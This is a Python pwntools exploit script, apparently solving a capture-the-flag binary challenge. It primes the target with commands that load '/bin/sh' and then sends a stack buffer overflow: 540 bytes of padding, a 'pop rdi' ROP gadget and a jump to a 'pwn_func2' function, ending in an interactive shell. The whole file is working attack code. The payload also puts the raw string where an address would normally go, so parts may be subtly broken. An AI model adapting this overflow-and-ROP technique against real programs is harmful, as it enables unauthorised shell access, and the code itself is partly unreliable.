#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys 
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or sys.argv[1])
rop = ROP(exe)
libc = exe.libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start()

#================= ROP Configuration ==================================
pwn_func2 = exe.symbols['pwn_func2']
print(f"pwn_func2: {hex(pwn_func2)}")
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
print(f"POP_RDI: {hex(POP_RDI)}")

#================= Setup Commands ==================================
io.recvuntil(b"Enter command: ")
io.sendline(b"mov_di 1000")
io.recvuntil(b"Enter command: ")
io.sendline(b"fetch_buf /bin/sh\x00")
io.recvuntil(b"Enter command: ")

#================= Payload Construction ==================================
payload = b"".join([
    b"prints ",
    b"A" * 540,
    b"\0" * 4,
    b"\0" * 8,
    p64(POP_RDI),
    b"/bin/sh\x00",
    p64(pwn_func2)
])

io.sendline(payload)
io.sendlineafter(b"Enter command: ", b"exec\n")
io.interactive()
io.close()
